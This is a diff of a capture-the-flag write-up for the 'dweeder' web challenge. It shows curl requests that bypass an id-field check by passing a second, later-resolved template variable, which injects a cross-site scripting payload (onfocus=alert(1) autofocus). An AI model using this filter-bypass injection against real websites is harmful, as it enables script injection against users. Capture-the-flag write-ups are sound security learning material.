@@ -81,9 +81,9 @@ curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kb
 
 ```
 From 3 attempts, we concluded a few things:
-- In the 1st attempt, we knew all the parameters that the server is expecting
-- In the second, we observed that the server allows creation of new parameters
-- In the third, we knew that the id parameter is not properly sanitized on the server side. Strangely enough, we could have still visited the dweed using the numeric ID provided by the server. This gave us another hint: server actually uses two types of ID for a dweed, but for what purpose then? 
+- In the 1st attempt, we knew all the parameters that the server was expecting
+- In the second, we observed that the server allowsedcreation of new parameters
+- In the third, we knew that the id parameter was not properly sanitized on the server side. Strangely enough, we could have still visited the dweed using the numeric ID provided by the server. This gave us another hint: server actually uses two types of ID for a dweed, but for what purpose then? 
 
 ## Exploiting
 The 3rd attempt told us that we needed to look into the id field. We tried to inject code into the id parameter to close the double quote.
@@ -91,9 +91,9 @@ The 3rd attempt told us that we needed to look into the id field. We tried to in
 curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kbGUiOiJ0ZXN0MjEzIn19:QmTpmSxf7FunhP98U3qAWP/vgJpmEbw4XHrpBkdqVIg=&title=a&contents=a&id=\"" -X POST https://dweeder.ctf.kaf.sh/apis/dweeder/?writeDweed
 {"result":"3136303531343736343936676d33","status":true}
 ```
-However, visiting the dweed renders nothing at this time. This was because the check within the insertDweed() found out that there was an illegal character "\" in the id's value, so it immediately returned. Fortunately, we could craft an id's value like this ``\${myvar}`` which passed the check. Note that we need to escape the dollar sign.
+However, visiting the dweed renders nothing at this time. This was because the check within the insertDweed() found out that there was an illegal character "\" in the id's value, so it immediately returned. 
 
-Since the server allows new parameter creation, and since ``$myvar`` shall be updated during the template's population after the id validation, we chained them together to get a new effective id. If ``${myvar}`` can be replaced with \" then we can indirectly assign ${id} = \". Let's see:
+Fortunately, since the server allowed new parameter creation(e.g.,$myvar), and since ``$myvar`` would be resolved after the check, we temporarily assigned id = ${myvar} in order to pass the first check. Later, ${myvar} would be resolved during template population. Note that we need to escape the dollar sign. 
 
 ```bash
 curl -d "token=eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6InRlc3QxMjMiLCJoYW5kbGUiOiJ0ZXN0MjEzIn19:QmTpmSxf7FunhP98U3qAWP/vgJpmEbw4XHrpBkdqVIg=&title=a&contents=a&id=\${myvar}&myvar='\" tabindex=1 onfocus=\"alert(1)\" autofocus " -X POST https://dweeder.ctf.kaf.sh/apis/dweeder/?writeDweed
